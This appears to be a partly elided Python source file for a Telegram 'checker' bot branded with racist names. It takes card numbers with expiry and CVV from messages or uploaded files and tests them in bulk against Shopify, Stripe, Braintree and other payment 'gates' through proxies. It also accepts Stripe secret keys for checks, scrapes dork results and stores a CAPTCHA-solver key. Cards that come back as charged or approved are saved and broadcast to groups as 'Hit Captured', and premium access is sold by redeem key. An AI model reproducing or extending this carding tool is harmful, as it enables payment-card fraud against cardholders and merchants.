...
def it(text: str) -> str:
    ...
    return "".join(_ITALIC_MAP.get(c, c) for c in str(text))


def bold(text: str) -> str:
    """Bold must internally use italic converter per spec."""
    return it(text)
...
def pe(emoji_id: str) -> str:
    """Wrap a custom emoji ID into Telegram premium emoji HTML. Fallback to bolt."""
...
if not TOKEN:
    log.error("BOT_TOKEN not set! Create a .env file with BOT_TOKEN=...")
    sys.exit(1)

BOT_NAME = "racism.hchk"
POWERED_BY = "@racisthenry"
CHANNEL_LINK = "https://t.me/+ODR6vIC6G-03MTkx"
GROUP_LINK = "https://t.me/+rxioFiLN2ZBmZTcx"

join_channel_id = -1004499669644
join_chat_id = -1004494885271
...
# ═══════════════════════════════════════════════════════════════════════════════
#  IMPORT GATE MODULES (try/except so missing modules don't kill the bot)
# ═══════════════════════════════════════════════════════════════════════════════

from helpers import (
    parse_proxy_format, test_proxy, bin_lookup,
    extract_cc, close_session, proxy_dict_to_url,
    classify_gate_response, gate_is_charged, gate_is_approved,
)
...
for name, alias in [
    ...
    try:
        ...
        log.warning("Gate module %s not loaded: %s", name, e)
        GATES[alias] = None
...
try:
    ...
    skcvv = None
    _SK_AVAILABLE = False
    log.warning("SK module not loaded: %s", e)
...
try:
    ...
    log.warning("Dork module not loaded: %s", e)
...
try:
    ...
    log.warning("Webshare module not loaded: %s", e)
...
try:
    ...
    log.warning("Gate module not loaded: %s", e)
...
br_gate = _load_gate_file("braintree1$.py")
...
# ═══════════════════════════════════════════════════════════════════════════════
#  OUTPUT FORMATTERS (ELVE GOLD / X D STYLE)
# ═══════════════════════════════════════════════════════════════════════════════

def mask_site(site: str) -> str:
    if not site:
        return "-"
    parsed = site.replace("https://", "").replace("http://", "").rstrip("/")
    if len(parsed) > 20:
        return parsed[:8] + "*******************" + parsed[-15:]
    return parsed
...
def format_single_result(
    ...
    lines = [
        ...
        f"{pe(E['site'])} {it('Site')} → {mask_site(site)}",
        f"{pe(E['amount'])} {it('Amount')} → {amount}",
        f"{pe(E['code'])} {it('Code')} → {code.upper()}",
        "━━━━━━━━━━━━━━━━━━━━",
        f"{pe(E['bin'])} {it('BIN')} → {bin_info.get('brand', '-')}",
        f"{pe(E['type'])} {it('Type')} → {bin_info.get('type', '-')} {bin_info.get('level', '')}".strip(),
        f"{pe(E['bank'])} {it('Bank')} → {bin_info.get('bank', '-')}",
        f"{pe(E['country'])} {it('Country')} → {bin_info.get('flag', '')} {bin_info.get('country', '-')}".strip(),
        "━━━━━━━━━━━━━━━━━━━━",
...
def format_maintenance_pause(checked: int, total: int, reason: str) -> str:
    lines = [
        ...
        f"{pe(E['warn'])} {it('STOPPED BY THE ADMINISTRATOR')}",
        "",
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        f"{pe(E['shield'])} {it('REASON')} → {reason}",
        "",
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        f"{pe(E['check'])} {it('YOUR PROGRESS')} → {checked} / {total} {it('CARDS CHECKED')}",
        "",
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
...
_COOLDOWN_CMDS = {"/sc", "/msc", "/br"}


def under_cooldown(uid: int) -> bool:
    last = _user_last_cmd.get(uid, 0.0)
    return (time.time() - last) < _ANTISPAM_COOLDOWN


def touch_cooldown(uid: int):
    _user_last_cmd[uid] = time.time()


def get_user_sem(uid: int) -> asyncio.Semaphore:
    if uid not in _user_semaphores:
        _user_semaphores[uid] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _user_semaphores[uid]


def get_ran_user_sem(uid: int) -> asyncio.Semaphore:
    if uid not in _ran_user_sems:
        _ran_user_sems[uid] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _ran_user_sems[uid]
...
async def notify_charged_approved(cc_str: str, gate_name: str, code: str, username: str):
    """Forward charged/approved results to monitor/approved groups and channel."""
    text = (
        f"{pe(E['charged'])} {it('Hit Captured')}\n"
        f"{pe(E['card'])} {cc_str}\n"
        f"{pe(E['gate'])} {gate_name}\n"
        f"{pe(E['code'])} {code}\n"
        f"{pe(E['user'])} @{username}\n"
        f"Powered by {POWERED_BY}"
    )
    for cid in (MONITOR_GROUP_ID, APPROVED_GROUP_ID):
        if cid:
            try:
                await bot.send_message(cid, text)
            except Exception as e:
                log.error("notify group %s: %s", cid, e)
    try:
        await bot.send_message(join_channel_id, text)
    except Exception as e:
        log.error("notify channel: %s", e)
...
async def _await_or_run(coro_or_call, *args, **kwargs):
    """Await async gate functions or run sync ones in ThreadPool."""
    if asyncio.iscoroutinefunction(coro_or_call):
        return await coro_or_call(*args, **kwargs)
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(CHECKER_POOL, lambda: coro_or_call(*args, **kwargs))
...
async def run_single_check(
    ...
    username: str,
    site: str | None = None,
    sk_pair: tuple[str, str] | None = None,
) -> dict:
    """Run one check through the appropriate gate."""
    proxy = get_user_proxy(user_id)
    gate = GATES.get(gate_alias)

    try:
        if gate_alias == "shopify":
            result = await _await_or_run(checker_bridge.check_card_site, cc, proxy, site or get_random_site())
        elif gate_alias == "st" and gate:
            result = await _await_or_run(gate.check, cc, proxy, site)
        elif gate_alias == "rz" and gate:
            result = await _await_or_run(gate.check, cc, proxy, site)
        elif gate_alias == "chk" and gate:
            result = await _await_or_run(gate.check, cc, proxy)
        elif gate_alias == "vbv" and gate:
            result = await _await_or_run(gate.check, cc, proxy)
        elif gate_alias == "br" and br_gate:
            result = await _await_or_run(br_gate.check, cc, proxy)
        elif gate_alias == "b3" and gate:
            result = await _await_or_run(gate.check, cc, proxy)
        elif gate_alias == "st1" and st1_gate:
            result = await _await_or_run(st1_gate.check, cc, proxy)
        elif gate_alias == "hit" and gate:
            result = await _await_or_run(gate.check, cc, proxy)
        elif gate_alias == "skcvv":
            if not _SK_AVAILABLE or not sk_pair:
                return {"status": "error", "code": "Stripe SK module not available", "cc": cc, "gate": "SK_CVV", "amount": "$0.00", "site": "-"}
            result = await _await_or_run(skcvv.check, sk_pair[0], sk_pair[1], cc, proxy)
        else:
            return {"status": "error", "code": "Module not loaded", "cc": cc, "gate": gate_alias.upper(), "amount": "$0.00", "site": "-"}
    except Exception as e:
        log.error("run_single_check %s: %s", gate_alias, e)
        return {"status": "error", "code": str(e)[:60], "cc": cc, "gate": gate_alias.upper(), "amount": "$0.00", "site": "-"}

    if not isinstance(result, dict):
        result = {"status": "error", "code": "bad gate response", "cc": cc, "gate": gate_alias.upper(), "amount": "$0.00", "site": "-"}

    # Ensure required fields
    result.setdefault("status", "error")
    result.setdefault("code", "UNKNOWN")
    result.setdefault("amount", "$0.00")
    result.setdefault("site", "-")
    result.setdefault("gate", gate_alias.upper())
    result.setdefault("cc", cc)

    # Save hits & notify
    if result["status"] in ("charged", "approved"):
        user_auth.save_charged_cc(user_id, cc)
        await notify_charged_approved(cc, result["gate"], result["code"], username)

    return result


async def send_check_result(message: types.Message, result: dict, user_id: int, username: str):
    cc = result.get("cc", "")
    bin_info = await bin_lookup(cc[:6]) if cc else {}
...
_file_check_state: dict[int, dict] = {}  # user_id -> {cards, gate, session_id, show_approved, msg, msg_id}
...
def parse_cards_from_text(text: str) -> list[str]:
    ...
    for line in text.splitlines():
        ...
        if not line:
            continue
        m = re.search(r"\d{13,19}\s*[-|/:]\s*\d{1,2}\s*[-|/:]\s*\d{2,4}\s*[-|/:]\s*\d{3,4}", line)
        if m:
            cards.append(m.group(0))
    return cards


def normalize_cc(raw: str) -> str | None:
    raw = raw.strip()
    m = re.search(r"(\d{13,19})\s*[-|/:]\s*(\d{1,2})\s*[-|/:]\s*(\d{2,4})\s*[-|/:]\s*(\d{3,4})", raw)
    if not m:
        return None
    number, mm, yy, cvv = m.groups()
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    return f"{number}|{mm}|{yy}|{cvv}"


async def do_file_check(
    user_id: int,
    chat_id: int,
    cards: list[str],
    gate_alias: str,
    ...
    _active_sessions[session_id] = {"user_id": user_id, "chat_id": chat_id, "total": len(cards), "checked": 0}
    _RAN_STOP_FLAGS[session_id] = False

    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0, "checked": 0}
    start = time.time()
    hits = []

    async def update_progress(last_cc: str = "", last_resp: str = ""):
        ...
        await safe_edit(reply_msg, text)

    await update_progress()

    sem = get_user_sem(user_id)

    async def worker(idx: int, raw_cc: str):
        if _RAN_STOP_FLAGS.get(session_id):
            return
        cc = normalize_cc(raw_cc)
        if not cc:
            stats["errors"] += 1
            return
        ...
        async with sem:
            try:
                result = await run_single_check(gate_alias, cc, user_id, "user", site=None)
            except Exception as e:
                log.error("file check worker: %s", e)
                result = {"status": "error", "code": str(e)[:40], "cc": cc, "gate": gate_alias.upper(), "amount": "$0.00", "site": "-"}
        ...
        _active_sessions[session_id]["checked"] = stats["checked"]

        if stats["checked"] % 5 == 0 or status in ("charged", "approved"):
            await update_progress(last_cc=cc, last_resp=result.get("code", ""))
    ...
    elapsed = str(datetime.timedelta(seconds=int(time.time() - start)))
    final_text = (
        f"{pe(E['check'])} {it('Check Finished')}\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"{pe(E['total'])} {it('Total')} → {len(cards)}\n"
        f"{pe(E['checked'])} {it('Checked')} → {stats['checked']}\n"
        f"{pe(E['progress_charged'])} {it('Charged')} → {stats['charged']}\n"
        f"{pe(E['progress_approved'])} {it('Approved')} → {stats['approved']}\n"
        f"{pe(E['progress_declined'])} {it('Declined')} → {stats['declined']}\n"
        f"{pe(E['errors'])} {it('Errors')} → {stats['errors']}\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"{pe(E['elapsed'])} {it('Elapsed')} → {elapsed}\n"
        f"Powered by {POWERED_BY}"
    )
    await safe_edit(reply_msg, final_text)

    for hit in hits[:20]:
        await send_check_result(reply_msg, hit, user_id, "user")

    _active_sessions.pop(session_id, None)
    _RAN_STOP_FLAGS.pop(session_id, None)
...
async def cb_verify_join(callback: types.CallbackQuery):
    try:
        ...
        if joined:
            await callback.message.edit_text(f"{pe(E['check'])} {it('Verified! Send /start')}")
        else:
            await callback.answer(it("Not joined yet."), show_alert=True)
    except Exception as e:
        log.error("cb_verify_join: %s", e)
...
async def cmd_me(message: types.Message):
    try:
        ...
        log.error("cmd_me: %s", e)
        print(f"cmd_me ERROR: {e}")
...
async def cmd_cmds(message: types.Message):
    try:
        ...
        log.error("cmd_cmds: %s", e)
        print(f"cmd_cmds ERROR: {e}")
...
async def cmd_proxy(message: types.Message):
    try:
        ...
        log.error("cmd_proxy: %s", e)
        print(f"cmd_proxy ERROR: {e}")
...
async def cmd_bin(message: types.Message):
    try:
        ...
        log.error("cmd_bin: %s", e)
        print(f"cmd_bin ERROR: {e}")
...
async def cmd_redeem(message: types.Message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /redeem HCHK-XXXX")
            return
        key = args[1].strip()
...
async def cmd_dork(message: types.Message):
    try:
        if not _DORK_AVAILABLE:
            await message.reply(f"{pe(E['cross'])} {it('Dork module not loaded')}")
            return
        args = message.text.split(maxsplit=1)
        query = args[1] if len(args) > 1 else "shop"
        urls = await _dork_mod.scrape(query, limit=20)
        text = f"{pe(E['globe'])} {it('Dork Results')}\n\n" + "\n".join(f"{pe(E['link'])} {u}" for u in urls[:20])
        await message.reply(text[:4000])
    except Exception as e:
        log.error("cmd_dork: %s", e)


# ═══════════════════════════════════════════════════════════════════════════════
#  SINGLE & MASS CHECK COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

async def ensure_premium_or_free_gate(message: types.Message, gate_alias: str) -> bool:
    uid = message.from_user.id
    if user_auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {it('You are banned!')}")
        return False
    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(it("Join channel and group first!"), reply_markup=join_keyboard())
    ...
    if maintenance_active():
        await message.reply(f"{pe(E['maintenance'])} {it('Bot is under maintenance')}\n{_MAINTENANCE_REASON}")
        return False
    if gate_alias != "shopify" and not user_auth.has_premium_access(uid):
        await message.reply(f"{pe(E['cross'])} {it('Premium required!')}")
        return False
    return True


async def handle_single_check(message: types.Message, gate_alias: str):
    try:
        if not await ensure_premium_or_free_gate(message, gate_alias):
            return
        uid = message.from_user.id
        if gate_alias in ("shopify",) and under_cooldown(uid):
            await message.reply(f"{pe(E['warn'])} {it('Cooldown active. Wait 20s.')}")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /{gate_alias} cc|mm|yy|cvv")
            return

        cc = normalize_cc(args[1])
        if not cc:
            await message.reply(f"{pe(E['cross'])} {it('Invalid card format!')}")
            return

        if not get_user_proxy(uid):
            await message.reply(f"{pe(E['warn'])} {it('No proxy set. Use /proxy first.')}")
            return

        if gate_alias in ("shopify",):
            touch_cooldown(uid)

        loading = await message.reply(f"{pe(E['loading'])} {it('Checking...')}")
        result = await run_single_check(gate_alias, cc, uid, message.from_user.username or "Unknown")
        await loading.delete()
        await send_check_result(message, result, uid, message.from_user.username or "Unknown")
    except Exception as e:
        log.error("handle_single_check %s: %s", gate_alias, e)
        print(f"handle_single_check {gate_alias} ERROR: {e}")


async def handle_mass_check(message: types.Message, gate_alias: str):
    try:
        if not await ensure_premium_or_free_gate(message, gate_alias):
            return
        uid = message.from_user.id
        if gate_alias in ("shopify", "br") and under_cooldown(uid):
            await message.reply(f"{pe(E['warn'])} {it('Cooldown active. Wait 20s.')}")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /m{gate_alias} cc|mm|yy|cvv ...")
            return

        cards = [normalize_cc(c) for c in args[1].split("\n") if normalize_cc(c)]
        if not cards:
            await message.reply(f"{pe(E['cross'])} {it('No valid cards found!')}")
            return

        total_limit = user_auth.get_total_limit(uid)
        if len(cards) > total_limit:
            await message.reply(f"{pe(E['cross'])} {it(f'Limit exceeded! Max {total_limit}')}")
            return
...
async def cmd_skcvv(message: types.Message):
    try:
        if not await ensure_premium_or_free_gate(message, "skcvv"):
            return
        uid = message.from_user.id
        sk_pair = get_user_sk(uid)
        if not sk_pair:
            await message.reply(f"{pe(E['warn'])} {it('No SK set. Use /skadd first.')}")
            return
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /skcvv cc|mm|yy|cvv")
            return
        cc = normalize_cc(args[1])
        if not cc:
            await message.reply(f"{pe(E['cross'])} {it('Invalid card format!')}")
            return
        loading = await message.reply(f"{pe(E['loading'])} {it('Checking SK...')}")
        result = await run_single_check("skcvv", cc, uid, message.from_user.username or "Unknown", sk_pair=sk_pair)
        await loading.delete()
        await send_check_result(message, result, uid, message.from_user.username or "Unknown")
    except Exception as e:
        log.error("cmd_skcvv: %s", e)
...
async def cmd_mskcvv(message: types.Message):
    try:
        ...
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /mskcvv cc|mm|yy|cvv ...")
            return
        cards = [normalize_cc(c) for c in args[1].split("\n") if normalize_cc(c)]
        if not cards:
            await message.reply(f"{pe(E['cross'])} {it('No valid cards found!')}")
            return
        reply_msg = await message.reply(f"{pe(E['loading'])} {it('Starting SK mass check...')}")
        await do_file_check(uid, message.chat.id, cards, "skcvv", show_approved=True, reply_msg=reply_msg)
    except Exception as e:
        log.error("cmd_mskcvv: %s", e)
...
async def cmd_skadd(message: types.Message):
    try:
        uid = message.from_user.id
        if not user_auth.has_premium_access(uid):
            await message.reply(f"{pe(E['cross'])} {it('Premium required!')}")
            return
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /skadd sk_xxx pk_xxx")
            return
        parts = args[1].split()
        if len(parts) < 2:
            await message.reply(f"{pe(E['cross'])} {it('Provide both SK and PK')}")
            return
        sk, pk = parts[0], parts[1]
        if not sk.startswith("sk_") or not pk.startswith("pk_"):
            await message.reply(f"{pe(E['cross'])} {it('Invalid SK/PK format')}")
            return
        if _SK_AVAILABLE:
            valid, msg = await skcvv.validate_key(sk, pk)
        else:
            valid, msg = True, "SK module not available (stub accepted)"
        if valid:
            set_user_sk(uid, sk, pk)
            await message.reply(f"{pe(E['check'])} {it('SK added!')}\n{msg}")
        else:
            await message.reply(f"{pe(E['cross'])} {it('SK validation failed')}\n{msg}")
    except Exception as e:
        log.error("cmd_skadd: %s", e)


# ── File check commands ────────────────────────────────────────────────────────
async def handle_file_command(message: types.Message, gate_alias: str):
    try:
        uid = message.from_user.id
        if not await ensure_premium_or_free_gate(message, gate_alias):
            return
        ...
        if not doc:
            await message.reply(f"{pe(E['warn'])} {it('Upload or reply to a .txt file with cards.')}")
            return

        if doc.file_size > MAX_FILE_SIZE:
            await message.reply(f"{pe(E['cross'])} {it('File too large! Max 25MB')}")
            return
        if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
            await message.reply(f"{pe(E['cross'])} {it('Only .txt files allowed!')}")
            return
        ...
        cards = [c for c in [normalize_cc(line) for line in text.splitlines()] if c]

        if not cards:
            await message.reply(f"{pe(E['cross'])} {it('No valid cards found in file!')}")
            return
...
async def cmd_yes(message: types.Message):
    try:
        uid = message.from_user.id
        state = _file_check_state.get(uid)
        if not state or state.get("show_approved") is not None:
            return
        state["show_approved"] = True
        cards = state["cards"]
        gate = state["gate"]
        reply_msg = await message.reply(f"{pe(E['loading'])} {it('Starting Check...')}")
        await do_file_check(uid, message.chat.id, cards, gate, show_approved=True, reply_msg=reply_msg)
        _file_check_state.pop(uid, None)
    except Exception as e:
        log.error("cmd_yes: %s", e)
...
async def cmd_no(message: types.Message):
    try:
        ...
        if not state or state.get("show_approved") is not None:
            return
        state["show_approved"] = False
        cards = state["cards"]
        gate = state["gate"]
        reply_msg = await message.reply(f"{pe(E['loading'])} {it('Starting Check...')}")
        await do_file_check(uid, message.chat.id, cards, gate, show_approved=False, reply_msg=reply_msg)
        _file_check_state.pop(uid, None)
    except Exception as e:
        log.error("cmd_no: %s", e)
...
async def cmd_stop(message: types.Message):
    try:
        ...
        for sid, session in list(_active_sessions.items()):
            if session.get("user_id") == uid or str(sid).startswith(f"{uid}_"):
                _RAN_STOP_FLAGS[sid] = True
                stopped = True
        if stopped:
            await message.reply(f"{pe(E['stop'])} {it('Stopping your active checks...')}")
        else:
            await message.reply(f"{pe(E['warn'])} {it('No active checks found.')}")
    except Exception as e:
        log.error("cmd_stop: %s", e)
...
async def cmd_stsite(message: types.Message):
    try:
        ...
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /stsite https://site.com")
            return
        res = add_user_stsite(uid, args[1].strip())
        if res == "added":
            await message.reply(f"{pe(E['check'])} {it('ST site added!')}")
        elif res == "duplicate":
            await message.reply(f"{pe(E['warn'])} {it('Site already in list.')}")
        else:
            await message.reply(f"{pe(E['cross'])} {it('ST site limit reached!')}")
    except Exception as e:
        log.error("cmd_stsite: %s", e)


@router.message(Command("strem"))
async def cmd_strem(message: types.Message):
    try:
        uid = message.from_user.id
        args = message.text.split(maxsplit=1)
        if len(args) < 2 or not args[1].strip().isdigit():
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /strem #")
            return
        del_user_stsite(uid, int(args[1].strip()))
        await message.reply(f"{pe(E['check'])} {it('ST site removed!')}")
    except Exception as e:
        log.error("cmd_strem: %s", e)


@router.message(Command("stmysite"))
async def cmd_stmysite(message: types.Message):
    try:
        sites = get_user_stsites(message.from_user.id)
        if not sites:
            await message.reply(f"{pe(E['cross'])} {it('No ST sites saved.')}")
            return
        text = f"{pe(E['globe'])} {it('Your ST Sites')}\n\n" + "\n".join(f"{i+1}. {s}" for i, s in enumerate(sites))
        await message.reply(text)
    except Exception as e:
        log.error("cmd_stmysite: %s", e)
...
async def cmd_rzsite(message: types.Message):
    try:
        ...
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /rzsite https://site.com")
            return
        res = add_user_rzsite(uid, args[1].strip())
        if res == "added":
            await message.reply(f"{pe(E['check'])} {it('RZ site added!')}")
        elif res == "duplicate":
            await message.reply(f"{pe(E['warn'])} {it('Site already in list.')}")
        else:
            await message.reply(f"{pe(E['cross'])} {it('RZ site limit reached!')}")
    except Exception as e:
        log.error("cmd_rzsite: %s", e)
...
async def cmd_rzrem(message: types.Message):
    try:
        ...
        args = message.text.split(maxsplit=1)
        if len(args) < 2 or not args[1].strip().isdigit():
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /rzrem #")
            return
        del_user_rzsite(uid, int(args[1].strip()))
        await message.reply(f"{pe(E['check'])} {it('RZ site removed!')}")
    except Exception as e:
        log.error("cmd_rzrem: %s", e)


@router.message(Command("rzmysite"))
async def cmd_rzmysite(message: types.Message):
    try:
        sites = get_user_rzsites(message.from_user.id)
        if not sites:
            await message.reply(f"{pe(E['cross'])} {it('No RZ sites saved.')}")
            return
        text = f"{pe(E['globe'])} {it('Your RZ Sites')}\n\n" + "\n".join(f"{i+1}. {s}" for i, s in enumerate(sites))
        await message.reply(text)
    except Exception as e:
        log.error("cmd_rzmysite: %s", e)
...
async def cmd_gate(message: types.Message):
    try:
        ...
        if not _GATE_AVAILABLE:
            await message.reply(f"{pe(E['cross'])} {it('Gate module not loaded')}")
            return
        ...
        if not urls:
            await message.reply(f"{pe(E['warn'])} {it('Reply to a .txt file or provide a file path.')}")
            return

        loading = await message.reply(f"{pe(E['loading'])} {it('Scanning gateways...')}")
        results = await _gate_mod.scan(urls, proxy=get_user_proxy(uid))
        lines = [f"{pe(E['gate'])} {it('Gateway Lookup Results')}\n"]
        for r in results[:30]:
            lines.append(f"{pe(E['site'])} {r.get('url', '-')} → {r.get('gateway', '-')}")
        await safe_edit(loading, "\n".join(lines)[:4000])
    except Exception as e:
        log.error("cmd_gate: %s", e)
...
async def cmd_nopecha(message: types.Message):
    try:
        ...
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.reply(f"{pe(E['warn'])} {it('Usage:')} /nopecha <api_key>")
            return
        # Stub: store in a simple file
        with open(os.path.join(BASE_DIR, "nopecha_key.txt"), "w", encoding="utf-8") as f:
            f.write(args[1].strip())
        await message.reply(f"{pe(E['check'])} {it('NopeCHA key set!')}")
    except Exception as e:
        log.error("cmd_nopecha: %s", e)
...
async def cmd_filter(message: types.Message):
    try:
        if not user_auth.is_owner(message.from_user.id):
            await message.reply(f"{pe(E['cross'])} {it('Owner only!')}")
            return
        await message.reply(f"{pe(E['check'])} {it('Dead sites filter')} — stub completed.")
    except Exception as e:
        log.error("cmd_filter: %s", e)
